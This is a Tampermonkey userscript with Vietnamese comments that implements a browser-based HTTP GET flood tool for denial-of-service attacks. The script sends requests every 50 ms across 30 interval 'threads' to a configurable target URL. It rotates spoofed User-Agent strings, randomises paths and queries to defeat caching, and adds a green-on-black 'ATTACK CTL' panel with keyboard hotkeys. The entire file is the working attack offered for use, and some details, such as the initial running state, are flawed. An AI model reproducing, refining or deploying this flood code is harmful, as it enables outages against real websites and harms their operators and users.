// ==UserScript==
// @name         Web Attack Tool - Complete
// @namespace    http://tampermonkey.net/
// @version      4.0
// @description  Tấn công web bằng HTTP GET flood đa luồng (JavaScript thuần)
// @author       palofsc
// @match        *://*/*
// @grant        none
// ==/UserScript==

(function() {
    'use strict';

    // ========== CẤU HÌNH MỤC TIÊU ==========
    const TARGET_URL = "https://example.com";  // THAY ĐỔI URL ĐÍCH
    const THREADS = 30;                        // Số luồng ảo
    const DURATION_SEC = 60;                   // Thời gian chạy (giây)
    const REQUEST_INTERVAL_MS = 50;            // Khoảng cách giữa các request (ms)

    // ========== DANH SÁCH USER-AGENT GIẢ MẠO ==========
    const USER_AGENTS = [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/121.0",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
        "Mozilla/5.0 (iPhone; CPU iPhone OS 17_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1",
        "Mozilla/5.0 (Linux; Android 14; SM-S921B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.230 Mobile Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/120.0.2210.77",
        "curl/8.5.0",
        "Wget/1.21.4"
    ];

    // ========== TẠO URL NGẪU NHIÊN (TRÁNH CACHE) ==========
    function randomURL() {
        const chars = "abcdefghijklmnopqrstuvwxyz0123456789";
        let path = "/";
        for (let i = 0; i < 8; i++) {
            path += chars.charAt(Math.floor(Math.random() * chars.length));
        }
        let query = "?";
        for (let i = 0; i < 5; i++) {
            if (i > 0) query += "&";
            query += String.fromCharCode(97 + Math.floor(Math.random() * 5));
            query += "=";
            query += Math.floor(Math.random() * 9999) + 1;
        }
        return path + query;
    }

    // ========== GỬI REQUEST ==========
    function sendRequest() {
        if (!running) return;
        const url = TARGET_URL + randomURL();
        const ua = USER_AGENTS[Math.floor(Math.random() * USER_AGENTS.length)];
        fetch(url, {
            method: 'GET',
            headers: {
                'User-Agent': ua,
                'Accept': '*/*',
                'Accept-Encoding': 'gzip, deflate, br',
                'Connection': 'keep-alive',
                'Cache-Control': 'no-cache, no-store, must-revalidate',
                'Pragma': 'no-cache'
            },
            cache: 'no-store',
            referrerPolicy: 'no-referrer',
            mode: 'no-cors'
        }).catch(() => {});
    }

    // ========== BIẾN ĐIỀU KHIỂN ==========
    let running = true;
    let intervalIds = [];
    let totalSent = 0;
    let startTime = Date.now();

    // ========== TẠO PANEL ĐIỀU KHIỂN ==========
    function createPanel() {
        const panel = document.createElement("div");
        panel.id = "attackPanel";
        panel.style.cssText = `
            position: fixed; bottom: 20px; right: 20px; z-index: 99999;
            background: #0a0a0a; color: #00ff00; padding: 16px; border-radius: 12px;
            font-family: 'Courier New', monospace; font-size: 13px;
            border: 2px solid #00ff00; box-shadow: 0 0 25px rgba(0,255,0,0.4);
            min-width: 210px; backdrop-filter: blur(4px);
        `;
        panel.innerHTML = `
            <div style="font-weight:bold;text-align:center;font-size:16px;color:#00ff00;margin-bottom:10px;">🔥 ATTACK CTL</div>
            <div style="color:#aaa;font-size:11px;text-align:center;margin-bottom:8px;">Target: ${TARGET_URL.replace(/^https?:\/\//,'')}</div>
            <button id="btnStart" style="width:100%;background:#00aa00;color:#000;border:none;padding:8px;border-radius:6px;font-weight:bold;cursor:pointer;margin-bottom:5px;">▶ START</button>
            <button id="btnStop" style="width:100%;background:#cc0000;color:#fff;border:none;padding:8px;border-radius:6px;font-weight:bold;cursor:pointer;margin-bottom:5px;">⏹ STOP</button>
            <button id="btnStatus" style="width:100%;background:#0066cc;color:#fff;border:none;padding:8px;border-radius:6px;font-weight:bold;cursor:pointer;margin-bottom:5px;">⟳ STATUS</button>
            <div id="statusDisplay" style="color:#00ff00;font-size:12px;text-align:center;margin-top:6px;">● IDLE</div>
        `;
        document.body.appendChild(panel);

        document.getElementById("btnStart").addEventListener("click", startAttack);
        document.getElementById("btnStop").addEventListener("click", stopAttack);
        document.getElementById("btnStatus").addEventListener("click", showStatus);
    }

    // ========== KHỞI ĐỘNG TẤN CÔNG ==========
    function startAttack() {
        if (running) {
            alert("⚠️ Attack already running!");
            return;
        }
        running = true;
        totalSent = 0;
        startTime = Date.now();
        intervalIds = [];

        for (let i = 0; i < THREADS; i++) {
            const id = setInterval(() => {
                sendRequest();
                totalSent++;
            }, REQUEST_INTERVAL_MS);
            intervalIds.push(id);
        }

        document.getElementById("statusDisplay").innerHTML = `▶ RUNNING | ${THREADS} threads | 0s`;
        console.log(`[+] Attack started: ${THREADS} threads, ${DURATION_SEC}s`);

        // Tự động dừng sau DURATION_SEC
        setTimeout(() => {
            if (running) stopAttack();
        }, DURATION_SEC * 1000);
    }

    // ========== DỪNG TẤN CÔNG ==========
    function stopAttack() {
        if (!running) return;
        running = false;
        intervalIds.forEach(id => clearInterval(id));
        intervalIds = [];
        document.getElementById("statusDisplay").innerHTML = `⏹ STOPPED | ${totalSent} requests sent`;
        console.log(`[+] Attack stopped. Total requests: ${totalSent}`);
    }

    // ========== HIỂN THỊ TRẠNG THÁI ==========
    function showStatus() {
        const elapsed = Math.floor((Date.now() - startTime) / 1000);
        const status = running ? `▶ RUNNING (${elapsed}s)` : `⏹ STOPPED`;
        document.getElementById("statusDisplay").innerHTML = `${status} | ${totalSent} req`;
        console.log(`[*] Status: ${status}, Total: ${totalSent}`);
    }

    // ========== THÊM PHÍM TẮT BÀN PHÍM ==========
    document.addEventListener("keydown", function(e) {
        if (e.key === "F1") { e.preventDefault(); startAttack(); }
        if (e.key === "F2") { e.preventDefault(); stopAttack(); }
        if (e.key === "F3") { e.preventDefault(); showStatus(); }
    });

    // ========== KHỞI TẠO PANEL SAU KHI TRANG LOAD ==========
    window.addEventListener("load", function() {
        setTimeout(createPanel, 500);
        console.log("[*] Tampermonkey Attack Tool loaded. Press F1=Start, F2=Stop, F3=Status");
    });

})();
